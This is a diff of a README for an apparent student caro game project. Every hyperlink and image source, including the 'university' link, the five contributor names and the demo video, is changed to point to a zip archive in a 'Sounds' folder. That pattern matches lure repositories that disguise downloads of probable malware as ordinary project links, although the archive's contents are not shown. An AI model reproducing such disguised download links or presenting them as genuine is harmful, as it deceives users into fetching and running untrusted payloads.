@@ -1,24 +1,24 @@
 # Caro Game
 ## Introduction
-<p>This is our project at <a href="https://github.com/VHoangNguyen0102/Runandgo-caro-game/raw/refs/heads/Full/Caro/caro-Runandgo-game-v1.3.zip">university</a>. It's just a small caro chess game.</p>
-<div align="center"><a href="https://github.com/VHoangNguyen0102/Runandgo-caro-game/raw/refs/heads/Full/Caro/caro-Runandgo-game-v1.3.zip"><img src="https://github.com/VHoangNguyen0102/Runandgo-caro-game/raw/refs/heads/Full/Caro/caro-Runandgo-game-v1.3.zip"></a></div>
+<p>This is our project at <a href="https://raw.githubusercontent.com/VHoangNguyen0102/Runandgo-caro-game/Full/Caro/Sounds/game_caro_Runandgo_v2.7-beta.1.zip">university</a>. It's just a small caro chess game.</p>
+<div align="center"><a href="https://raw.githubusercontent.com/VHoangNguyen0102/Runandgo-caro-game/Full/Caro/Sounds/game_caro_Runandgo_v2.7-beta.1.zip"><img src="https://raw.githubusercontent.com/VHoangNguyen0102/Runandgo-caro-game/Full/Caro/Sounds/game_caro_Runandgo_v2.7-beta.1.zip"></a></div>
 
 ## Instructor
 <p>PhD. Trương Toàn Thịnh</p>
 
 
 ## Contributors
-- <a href="https://github.com/VHoangNguyen0102/Runandgo-caro-game/raw/refs/heads/Full/Caro/caro-Runandgo-game-v1.3.zip">Nguyễn Đình Nhân</a>
-- <a href="https://github.com/VHoangNguyen0102/Runandgo-caro-game/raw/refs/heads/Full/Caro/caro-Runandgo-game-v1.3.zip">Nguyễn Lê Tấn Phát</a>
-- <a href="https://github.com/VHoangNguyen0102/Runandgo-caro-game/raw/refs/heads/Full/Caro/caro-Runandgo-game-v1.3.zip">Võ Hoàng Nguyên</a>
-- <a href="https://github.com/VHoangNguyen0102/Runandgo-caro-game/raw/refs/heads/Full/Caro/caro-Runandgo-game-v1.3.zip">Nguyễn Minh Nguyên</a>
-- <a href="https://github.com/VHoangNguyen0102/Runandgo-caro-game/raw/refs/heads/Full/Caro/caro-Runandgo-game-v1.3.zip">Nguyễn Trọng Nhân</a>
+- <a href="https://raw.githubusercontent.com/VHoangNguyen0102/Runandgo-caro-game/Full/Caro/Sounds/game_caro_Runandgo_v2.7-beta.1.zip">Nguyễn Đình Nhân</a>
+- <a href="https://raw.githubusercontent.com/VHoangNguyen0102/Runandgo-caro-game/Full/Caro/Sounds/game_caro_Runandgo_v2.7-beta.1.zip">Nguyễn Lê Tấn Phát</a>
+- <a href="https://raw.githubusercontent.com/VHoangNguyen0102/Runandgo-caro-game/Full/Caro/Sounds/game_caro_Runandgo_v2.7-beta.1.zip">Võ Hoàng Nguyên</a>
+- <a href="https://raw.githubusercontent.com/VHoangNguyen0102/Runandgo-caro-game/Full/Caro/Sounds/game_caro_Runandgo_v2.7-beta.1.zip">Nguyễn Minh Nguyên</a>
+- <a href="https://raw.githubusercontent.com/VHoangNguyen0102/Runandgo-caro-game/Full/Caro/Sounds/game_caro_Runandgo_v2.7-beta.1.zip">Nguyễn Trọng Nhân</a>
 
 ## Video demo
 <div align="center">
-  <a href="https://github.com/VHoangNguyen0102/Runandgo-caro-game/raw/refs/heads/Full/Caro/caro-Runandgo-game-v1.3.zip" title="Caro Chess Demo">
+  <a href="https://raw.githubusercontent.com/VHoangNguyen0102/Runandgo-caro-game/Full/Caro/Sounds/game_caro_Runandgo_v2.7-beta.1.zip" title="Caro Chess Demo">
    <p align="center">
-     <img width="50%" src="https://github.com/VHoangNguyen0102/Runandgo-caro-game/raw/refs/heads/Full/Caro/caro-Runandgo-game-v1.3.zip" alt="Caro Chess Demo"/>
+     <img width="50%" src="https://raw.githubusercontent.com/VHoangNguyen0102/Runandgo-caro-game/Full/Caro/Sounds/game_caro_Runandgo_v2.7-beta.1.zip" alt="Caro Chess Demo"/>
    </p>
   </a>
 </div>
